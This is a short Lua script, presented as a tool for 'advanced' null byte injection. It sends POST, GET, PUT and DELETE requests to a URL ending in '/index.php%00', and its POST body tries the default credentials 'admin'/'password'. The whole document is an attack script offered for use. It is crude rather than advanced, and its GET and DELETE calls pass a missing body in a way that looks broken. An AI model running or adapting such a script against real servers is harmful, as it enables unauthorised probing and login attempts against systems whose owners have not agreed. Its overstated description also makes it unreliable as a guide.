-- Lua script for Advanced Null Byte Injection in HTTP requests

-- Libraries for HTTP handling and URL manipulation
local http = require("socket.http")
local ltn12 = require("ltn12")
local url = require("socket.url")

-- Target URL and payload with null byte injection
local target_url = "http://example.com"
local payload = "/index.php%00"

-- Function to send HTTP request
local function send_http_request(url, method, headers, body)
    local response_body = {}
    local request = {
        url = url,
        method = method,
        headers = headers,
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }

    local res, code, response_headers = http.request(request)

    if code == 200 then
        print("Request successful. Response body:")
        print(table.concat(response_body))
    else
        print("Request failed. HTTP code:", code)
    end
end

-- Construct the full URL with payload
local full_url = target_url .. payload

-- Example headers (adjust as needed)
local headers = {
    ["User-Agent"] = "Mozilla/5.0",
    ["Content-Type"] = "application/x-www-form-urlencoded",
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}

-- Example POST body data (adjust as needed)
local post_data = "username=admin&password=password"

-- Execute a POST request with headers and body
send_http_request(full_url, "POST", headers, post_data)

-- Example GET request with headers
send_http_request(full_url, "GET", headers)

-- Example PUT request with headers and body
send_http_request(full_url, "PUT", headers, "Put data")

-- Example DELETE request with headers
send_http_request(full_url, "DELETE", headers)
